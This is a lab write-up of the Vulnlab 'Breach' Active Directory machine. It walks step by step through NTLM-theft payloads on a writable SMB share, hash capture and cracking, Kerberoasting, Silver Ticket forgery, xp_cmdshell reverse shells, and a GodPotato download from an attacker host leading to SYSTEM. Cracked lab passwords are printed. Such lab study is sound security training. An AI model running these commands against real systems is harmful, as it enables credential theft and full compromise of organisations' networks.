+++
date = '2026-07-08T17:27:08+02:00'
draft = false
title = 'Breach Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`08/06/2026`**

![Breach.png](/images/imgs_breach/Breach.png)

---
# Introduction

**_Breach_** is a **Medium-level Active Directory** environment from **Vulnlab** that perfectly simulates a highly realistic attack path starting from a simple misconfigured network share and ending with full system compromise via **Kerberos** ticket manipulation.

The initial foothold relies on discovering a globally writable **SMB** share. By uploading malicious payload files generated via **NTLM Theft**, I forced a user's machine to authenticate back to my rogue **SMB** server, capturing their **NetNTLMv2 hash**. After cracking it, I used the compromised account to perform a **Kerberoasting** attack against an **MSSQL** service account.
Armed with the service account's password, I forged a **Silver Ticket** to gain administrative access to the database, extracting both flags. Finally, not satisfied with just the flags, I enabled **`xp_cmdshell`** to pop a reverse shell and abused the **`SeImpersonatePrivilege`** via **GodPotato** to gain full control over the system.

---
# Techniques Used

- **NTLM Hash Capture (NTLM Theft)**

- **Kerberoasting**

- **Silver Ticket Attack**

- **MSSQL Exploitation**

- **Token Impersonation via GodPotato attack** 

---
# Enumeration

## nmap 

Initial full port scan:

```bash
nmap -p- -Pn breach
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49677/tcp open  unknown
49919/tcp open  unknown
```

Targeted scan with script and service detection:

```bash
nmap -sC -sV -Pn breach 
```

```text
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-06-08 08:06:34Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-08T08:06:39+00:00
|_ssl-date: 2026-06-08T08:07:18+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Issuer: commonName=BREACHDC.breach.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-07T08:04:56
| Not valid after:  2026-12-07T08:04:56
| MD5:     5435 77ce c801 dfac ff50 ad9e ec0e 23d8
| SHA-1:   0b3e f543 d1fc 18de 87c8 05ea 3bf1 f132 3f2b eedd
| SHA-256: 65a5 695d adfa 2a4e 15fe ce25 a9d8 89ee 8032 a2f8 fa6e dbf6 1ee5 8211 4cce f873
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-08T08:06:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 47018/tcp): CLEAN (Timeout)
|   Check 2 (port 27693/tcp): CLEAN (Timeout)
|   Check 3 (port 18169/udp): CLEAN (Timeout)
|   Check 4 (port 57375/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
```

**Open Ports**:
- **53**/tcp - DNS

- **80**/tcp - HTTP

- **88**/tcp - Kerberos

- **135**/tcp - MSRPC

- **139**/tcp - netbios-ssn

- **389**/tcp - LDAP

- **445**/tcp - microsoft-ds (SMB)

- **464**/tcp - kpasswd5

- **593**/tcp - ncacn_http

- **636**/tcp - ssl/ldap

- **1433**/tcp - ms-sql-s (MSSQL)

- **3268**/tcp - LDAP Global Catalog

- **3269**/tcp - ssl/ldap Global Catalog

- **3389**/tcp - RDP

- **5985**/tcp - WinRM

- **9389**/tcp - ADWS

I added **`breach.vl`** and **`breachdc.breach.vl`** to my **`/etc/hosts`**.

# SMB Enumeration & Information Gathering

I began by enumerating **SMB** shares to check for anonymous or Guest access using **NetExec**:

```bash
nxc smb breach.vl -u Guest -p '' --shares
```

![smbanon.png](/images/imgs_breach/smbanon.png)

The output revealed a non-default share named **`share`**. I connected to it using smbclient:

```bash
smbclient \\\\breach.vl\\share -U Guest
```

![shareshare.png](/images/imgs_breach/shareshare.png)

Inside the share, I navigated to the **`transfer/`** directory and found a userlist, which I immediately downloaded and cleaned up into a local file named **`users`**.

I attempted a standard **password spraying** attack against the **SMB** service using the extracted userlist, but it yielded no results:

```bash
nxc smb breach.vl -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

![brutefail.png](/images/imgs_breach/brutefail.png)

---
# Initial Access | NTLM Theft & Password Cracking

While enumerating the **`share`** directory, I realized my Guest session had **write permissions**. This is a classic misconfiguration that can be leveraged to **capture hashes**.

**Note**: _By placing specially crafted files (like **`.lnk`**, **`.scf`**, or **`.url`**) on a public **SMB** share, an attacker can force the **Windows Explorer** process of any user who simply browses that folder to automatically attempt authentication against the attacker's machine, effectively leaking their **NetNTLMv2 hash**._

I did a quick **Google** search for "**NTLM Theft**" and used the popular tool by **Greenwolf** to generate the malicious payload files.

- **https://github.com/Greenwolf/ntlm_theft**

I set up a **Python virtual environment** and installed the dependencies:

```bash
python3 -m venv venv

source venv/bin/activate

pip3 install xlsxwriter

python3 ntlm_theft.py -g all -s <attacker_ip> -f stars
```

![ntlmtcreation.png](/images/imgs_breach/ntlmtcreation.png)

Next, I started **Responder** on my **VPN** interface to listen for incoming authentication requests:

```bash
sudo responder -I tun0
```

I connected back to the writable share and uploaded all the generated payloads into the **`transfer/`** directory:

```bash
smbclient \\\\breach.vl\\share -U Guest

cd transfer

mput *
```

After a short wait, a user browsed the folder, and **Responder** caught a **NetNTLMv2 hash** for the user **`Julia.Wong`**.

![juliantlm.png](/images/imgs_breach/juliantlm.png)

I copied the hash into a file named **`julia_hash`** and cracked it using **John The Ripper**:

```bash
john julia_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![juliacrack.png](/images/imgs_breach/juliacrack.png)

---
# Lateral Movement | Kerberoasting & Silver Ticket Attack

## Kerberoasting

Now equipped with valid domain credentials (**`Julia.Wong:Computer1`**), I could query **Active Directory** for **Service Principal Names** (**SPNs**) to perform a **Kerberoasting** attack.

I used **Impacket**'s **`GetUserSPNs.py`**:

```bash
pip3 install impacket

GetUserSPNs.py breach.vl/Julia.Wong:"Computer1" -dc-ip breach.vl
```

The script identified a service account: **`svc_mssql`**. I ran the command again with the **`-request`** flag to extract the **Kerberos Ticket Granting Service** (**TGS**):

![mssqltgs.png](/images/imgs_breach/mssqltgs.png)

I saved the hash into **`krb5tgs`** and cracked it with **John**:

```bash
john krb5tgs --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
```

![mssqlpass.png](/images/imgs_breach/mssqlpass.png)

## Silver Ticket Forgery

With the service account password in hand, I could have tried to log in directly. However, to guarantee maximum privileges over the database, I opted for a **Silver Ticket** attack.

**Note**: _A **Silver Ticket** is a forged **TGS** (**Ticket Granting Service**) generated offline by the attacker. Since the **TGS** is encrypted using the **NT hash** of the service account, we can forge a valid ticket for that specific service, granting ourselves **Domain Admin level access** to it, without ever interacting with the **Domain Controller**._

To forge the ticket, I needed two things:

- **The Domain SID**.

- **The NT Hash of the `svc_mssql` password (Trustno1)**.

I retrieved the Domain **SID** using **Impacket**'s **`lookupsid.py`**:

```bash
lookupsid.py "svc_mssql:Trustno1"@breach.vl
```

![sid.png](/images/imgs_breach/sid.png)

Then, I used [Code Beautify](https://codebeautify.org/ntlm-hash-generator), an online converter to generate the **NT Hash** for the string **Trustno1**.

![converted.png](/images/imgs_breach/converted.png)

Using **Impacket**'s **`ticketer.py`**, I forged a **Silver Ticket** for the **MSSQL** service, explicitly injecting the **`RID 500`** (**Domain Administrator**):

```bash
impacket-ticketer -nthash <converted_nt_hash> -domain-sid <DOMAIN_SID> -domain breach.vl -spn "MSSQL/BREACH.VL:1433@BREACH.VL" -user-id 500 Administrator
```

![ticket.png](/images/imgs_breach/ticket.png)

I exported the resulting **`.ccache`** file into my environment variables:

```bash
export KRB5CCNAME=Administrator.ccache
```

Finally, I connected to the database using **Kerberos** authentication:

```bash
impacket-mssqlclient -k -no-pass breach.vl -windows-auth
```

![mssqladmin.png](/images/imgs_breach/mssqladmin.png)

I searched Google for the correct **MSSQL** query to read local files and used the **`OPENROWSET`** function to retrieve both the **user** and **root flags** directly from the database prompt:

```bash
SELECT * FROM OPENROWSET(BULK N'C:\share\transfer\julia.wong\user.txt', SINGLE_CLOB) AS Contents;
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
```

![userflag.png](/images/imgs_breach/userflag.png)

![rootflag.png](/images/imgs_breach/rootflag.png)

At this point, the box was technically completed. But as always, I wanted full control over the underlying system, not just the database instance.

---
# Full System Compromise | xp_cmdshell & GodPotato Attack

From the **mssqlclient** prompt, I enabled the **`xp_cmdshell`** advanced option, which allows the execution of system commands via **SQL** queries:

```bash
EXEC sp_configure 'show advanced options', 1;

RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;

RECONFIGURE;
```

I grabbed a **Base64-encoded PowerShell** reverse shell payload (the classic you can find on **[Revshell Generator](https://www.revshells.com/))** and executed it:

```bash
EXEC xp_cmdshell 'powershell -exec bypass -enc <BASE64_PAYLOAD>';
```

![revshell.png](/images/imgs_breach/revshell.png)

I caught the shell on my **Netcat** listener, landing as the **`svc_mssql`** user.

![initialaccess.png](/images/imgs_breach/initialaccess.png)

I immediately checked my privileges:

```powershell
whoami /priv
```

![impersonate.png](/images/imgs_breach/impersonate.png)

I noticed that **`SeImpersonatePrivilege`** was enabled.

**Note**: _The **`SeImpersonatePrivilege`** allows a process to impersonate any access token it can get its hands on. It is incredibly common on service accounts (like **IIS** or **MSSQL**) and is a guaranteed path to **SYSTEM**._

I navigated to **`C:\Users\svc_mssql\Desktop`** and downloaded **[GodPotato](https://github.com/BeichenDream/GodPotato)**, a modern tool for exploiting this exact privilege:

```bash
iwr -uri http://<ATTACKER_IP>:8000/GodPotato-NET4.exe -Outfile patata.exe
```

I executed **`patata.exe`**, instructing it to launch another **Base64-encoded** reverse shell payload:

```bash
.\patata.exe -cmd "powershell -exec bypass -enc <BASE64_PAYLOAD_2>"
```

On my second **Netcat** listener, I received a callback.

![systemproof.png](/images/imgs_breach/systemproof.png)

**Box fully owned**.

---
# Final Thoughts

**_Breach_** is an outstanding machine that perfectly chains together some of the most satisfying **Active Directory** exploits.

The initial access phase is an example of how an innocent-looking misconfiguration (a writable public share) can lead to devastating consequences when combined with **NTLM Theft**. It’s a very common **Low-Hanging Fruit** in real-world engagements.

The lateral movement phase perfectly illustrates the power of a **Silver Ticket attack**. Forging the ticket to impersonate the Domain **Administrator** allowed us to bypass any local database restrictions.
Taking the **Extra Mile** to break out of the **MSSQL** environment via **`xp_cmdshell`** and escalating to **SYSTEM** via **`SeImpersonate`** was a great exercise to understand the methodology and mindset behind real-world **Red Team** operations.

**Sources**:

- **NTLM Theft (Greenwolf) | https://github.com/Greenwolf/ntlm_theft**

- **Silver Ticket Attack | https://www.youtube.com/watch?v=KngApymmV60&list=PLJnLaWkc9xRi71Pso26JlvyBkLUOETLjn&index=8**

- **Code Beautify | https://codebeautify.org/ntlm-hash-generator**

- **Revshell Generator | https://www.revshells.com/**

- **MSSQL OPENROWSET Trick | https://stackoverflow.com/questions/2007857/reading-a-text-file-with-sql-server**

- **GodPotato | https://github.com/BeichenDream/GodPotato**
